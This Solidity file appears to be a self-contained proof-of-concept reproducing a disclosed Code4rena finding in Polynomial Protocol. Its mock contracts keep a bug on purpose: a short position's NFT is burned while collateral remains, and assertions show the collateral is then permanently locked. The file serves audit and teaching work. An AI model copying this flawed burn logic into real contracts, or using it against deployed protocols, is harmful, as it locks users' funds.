// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Polynomial Protocol — [H-03] Short positions can be burned while holding
    collateral (Code4rena 2023-03; finding #20226, reporter Bauer)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    ShortToken.adjustPosition burn logic is inlined VERBATIM:

        position.collateralAmount = collateralAmount;
        position.shortAmount = shortAmount;
        if (position.shortAmount == 0) {   // @> burns even with collateral left
            _burn(positionId);
        }

    Root cause: adjustPosition burns a position's ERC721 the instant its
    shortAmount reaches 0, WITHOUT checking that collateralAmount is also 0. A
    user who reduces a short to 0 while keeping collateral (or whose short is
    fully liquidated with residual collateral) has their position NFT burned
    while ShortCollateral still physically holds their collateral. Because
    ShortCollateral.sendCollateral resolves the recipient via
    shortToken.ownerOf(positionId) — which now reverts NOT_MINTED — that
    collateral can NEVER be withdrawn. It is permanently locked.

    Harm class: loss of funds (collateral permanently locked). No token is
    extracted by anyone, so this is surfaced as a zero-profit INVARIANT: run()
    ends with require() assertions proving the position is burned, the
    collateral is still held by ShortCollateral, and every retrieval path
    reverts.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 (sUSD) used as short-position collateral.
contract MockERC20 {
    string public name = "Synthetic USD";
    string public symbol = "sUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced ShortToken. An ERC721 (solmate-style NOT_MINTED semantics)
///         whose per-position accounting is mutated by the Exchange through
///         adjustPosition. Contains the verbatim vulnerable burn logic.
contract ShortToken {
    struct ShortPosition {
        address collateral; // collateral token address
        uint256 shortAmount; // outstanding short size
        uint256 collateralAmount; // collateral recorded against the position
        uint256 positionId;
    }

    // ---- minimal ERC721 (solmate semantics) ----
    mapping(uint256 => address) internal _ownerOf;

    // ---- short-position book ----
    mapping(uint256 => ShortPosition) public shortPositions;
    uint256 public totalShorts;
    uint256 public positionCount;

    address public exchange;

    function setExchange(address _exchange) external {
        require(exchange == address(0), "SET");
        exchange = _exchange;
    }

    modifier onlyExchange() {
        require(msg.sender == exchange, "ONLY_EXCHANGE");
        _;
    }

    function ownerOf(uint256 id) public view returns (address owner) {
        require((owner = _ownerOf[id]) != address(0), "NOT_MINTED");
    }

    function _mint(address to, uint256 id) internal {
        _ownerOf[id] = to;
    }

    function _burn(uint256 id) internal {
        delete _ownerOf[id];
    }

    /// @notice Handles changes to a short position's short/collateral amounts.
    ///         VERBATIM reduction of Polynomial's ShortToken.adjustPosition.
    function adjustPosition(
        uint256 positionId,
        address trader,
        address collateral,
        uint256 shortAmount,
        uint256 collateralAmount
    ) external onlyExchange returns (uint256) {
        if (positionId == 0) {
            positionId = ++positionCount;
            _mint(trader, positionId);

            ShortPosition storage position = shortPositions[positionId];
            position.collateral = collateral;
            position.shortAmount = shortAmount;
            position.collateralAmount = collateralAmount;
            position.positionId = positionId;

            totalShorts += shortAmount;
        } else {
            require(trader == ownerOf(positionId));

            ShortPosition storage position = shortPositions[positionId];

            if (shortAmount >= position.shortAmount) {
                totalShorts += shortAmount - position.shortAmount;
            } else {
                totalShorts -= position.shortAmount - shortAmount;
            }

            position.collateralAmount = collateralAmount;
            position.shortAmount = shortAmount;

            if (position.shortAmount == 0) {
                _burn(positionId); // @> VULN: burns the position even when collateralAmount != 0 -> collateral locked
            }
        }

        return positionId;
    }
}

/// @notice Reduced ShortCollateral. Physically custodies each position's
///         collateral tokens; sends them back to the position's CURRENT owner.
contract ShortCollateral {
    struct UserCollateral {
        address collateral;
        uint256 amount;
    }

    mapping(uint256 => UserCollateral) public userCollaterals;
    ShortToken public immutable shortToken;
    address public exchange;

    constructor(ShortToken _shortToken) {
        shortToken = _shortToken;
    }

    function setExchange(address _exchange) external {
        require(exchange == address(0), "SET");
        exchange = _exchange;
    }

    modifier onlyExchange() {
        require(msg.sender == exchange, "ONLY_EXCHANGE");
        _;
    }

    function collectCollateral(uint256 positionId, address collateral, uint256 amount) external onlyExchange {
        UserCollateral storage uc = userCollaterals[positionId];
        uc.collateral = collateral;
        uc.amount += amount;
    }

    /// @notice Return `amount` of collateral to the position's owner.
    ///         Resolves the recipient via shortToken.ownerOf — which reverts
    ///         NOT_MINTED once the position has been burned, so a burned
    ///         position's residual collateral becomes unrecoverable.
    function sendCollateral(uint256 positionId, uint256 amount) external onlyExchange {
        UserCollateral storage uc = userCollaterals[positionId];
        uc.amount -= amount;
        address user = shortToken.ownerOf(positionId); // reverts NOT_MINTED after burn
        MockERC20(uc.collateral).transfer(user, amount);
    }
}

/// @notice Reduced Exchange. Opens/closes short positions, routing collateral
///         through ShortCollateral and position accounting through ShortToken.
contract Exchange {
    ShortToken public immutable shortToken;
    ShortCollateral public immutable shortCollateral;

    constructor(ShortToken _shortToken, ShortCollateral _shortCollateral) {
        shortToken = _shortToken;
        shortCollateral = _shortCollateral;
    }

    /// @notice Open a short: pull `collateralAmount` collateral, mint position.
    function openTrade(address collateral, uint256 amount, uint256 collateralAmount)
        external
        returns (uint256 positionId)
    {
        // pull collateral from the trader into ShortCollateral custody
        MockERC20(collateral).transferFrom(msg.sender, address(shortCollateral), collateralAmount);
        positionId = shortToken.adjustPosition(0, msg.sender, collateral, amount, collateralAmount);
        shortCollateral.collectCollateral(positionId, collateral, collateralAmount);
    }

    /// @notice Reduce a short by `closeShortAmount`, withdrawing
    ///         `collateralToWithdraw` collateral. Faithful to the H-03 flow:
    ///         the trader can drive shortAmount to 0 while keeping collateral.
    function closeTrade(uint256 positionId, uint256 closeShortAmount, uint256 collateralToWithdraw) external {
        (address collateral, uint256 curShort, uint256 curColl,) = shortToken.shortPositions(positionId);
        require(msg.sender == shortToken.ownerOf(positionId), "NOT_OWNER");

        uint256 finalShort = curShort - closeShortAmount;
        uint256 finalColl = curColl - collateralToWithdraw;

        // send the withdrawn slice back to the trader BEFORE the burn
        if (collateralToWithdraw > 0) {
            shortCollateral.sendCollateral(positionId, collateralToWithdraw);
        }

        // update the position; adjustPosition burns it if finalShort == 0
        shortToken.adjustPosition(positionId, msg.sender, collateral, finalShort, finalColl);
    }

    /// @notice A protocol/keeper attempt to return locked collateral to a
    ///         position's owner. Reverts once the position is burned because
    ///         ShortCollateral.sendCollateral resolves the owner via ownerOf.
    function recoverCollateral(uint256 positionId, uint256 amount) external {
        shortCollateral.sendCollateral(positionId, amount);
    }
}

/// @notice The victim: a normal user who opens a short and later fully closes
///         it while keeping collateral (a realistic H-03 scenario 1 action).
contract Victim {
    Exchange public exchange;
    MockERC20 public susd;

    constructor(Exchange _exchange, MockERC20 _susd) {
        exchange = _exchange;
        susd = _susd;
    }

    function openShort(address collateral, uint256 amount, uint256 collateralAmount) external returns (uint256) {
        susd.approve(address(exchange), collateralAmount);
        return exchange.openTrade(collateral, amount, collateralAmount);
    }

    function closeShort(uint256 positionId, uint256 closeShortAmount, uint256 collateralToWithdraw) external {
        exchange.closeTrade(positionId, closeShortAmount, collateralToWithdraw);
    }
}

/// @dev Orchestrator: deploys the reduced Polynomial short stack, has the
///      victim open then fully close a short while keeping collateral, and
///      asserts the residual collateral is permanently locked by the burn.
contract Exploit {
    uint256 public constant SHORT_AMOUNT = 1e18;
    uint256 public constant COLLATERAL = 1e15;

    MockERC20 public susd;
    ShortToken public shortToken;
    ShortCollateral public shortCollateral;
    Exchange public exchange;
    Victim public victim;
    address public deployer;
    uint256 public positionId;

    constructor() {
        deployer = msg.sender;
        susd = new MockERC20(); // CREATE nonce 1
        shortToken = new ShortToken(); // CREATE nonce 2 (vulnerable)
        shortCollateral = new ShortCollateral(shortToken); // CREATE nonce 3
        exchange = new Exchange(shortToken, shortCollateral); // CREATE nonce 4
        victim = new Victim(exchange, susd); // CREATE nonce 5

        shortToken.setExchange(address(exchange));
        shortCollateral.setExchange(address(exchange));

        // Fund the victim with the collateral they will short against.
        susd.mint(address(victim), COLLATERAL);
    }

    function run() external {
        // 1. Victim opens a short: deposits 1e15 collateral, shorts 1e18.
        positionId = victim.openShort(address(susd), SHORT_AMOUNT, COLLATERAL);
        require(shortToken.ownerOf(positionId) == address(victim), "open failed");

        // 2. Victim fully closes the short (shortAmount -> 0) but withdraws NO
        //    collateral (collateralToWithdraw = 0), so the position keeps its
        //    full 1e15 collateral. adjustPosition burns it anyway.
        victim.closeShort(positionId, SHORT_AMOUNT, 0);

        // === HARM ===
        // The position's collateral is still recorded and physically held...
        (, uint256 remShort, uint256 remColl,) = shortToken.shortPositions(positionId);
        require(remShort == 0, "short not zeroed");
        require(remColl == COLLATERAL, "collateral not retained on burned position");
        (, uint256 custodied) = shortCollateral.userCollaterals(positionId);
        require(custodied == COLLATERAL, "collateral not in custody");
        require(susd.balanceOf(address(shortCollateral)) == COLLATERAL, "collateral left the vault");

        // ...but the position NFT is burned: ownerOf reverts NOT_MINTED.
        require(_ownerOfReverts(positionId), "position was not burned");

        // ...and there is no way to ever retrieve it: sendCollateral resolves
        // the recipient via ownerOf, which now reverts. The 1e15 collateral is
        // permanently locked. The victim received nothing back.
        require(susd.balanceOf(address(victim)) == 0, "victim recovered funds");
        require(_sendCollateralReverts(positionId, COLLATERAL), "collateral was recoverable");
    }

    function _ownerOfReverts(uint256 id) internal view returns (bool) {
        try shortToken.ownerOf(id) returns (address) {
            return false;
        } catch {
            return true;
        }
    }

    function _sendCollateralReverts(uint256 id, uint256 amount) internal returns (bool) {
        // The only authorized caller (the exchange) tries to return the locked
        // collateral; it must revert because the burned position has no owner.
        try exchange.recoverCollateral(id, amount) {
            return false;
        } catch {
            return true;
        }
    }
}
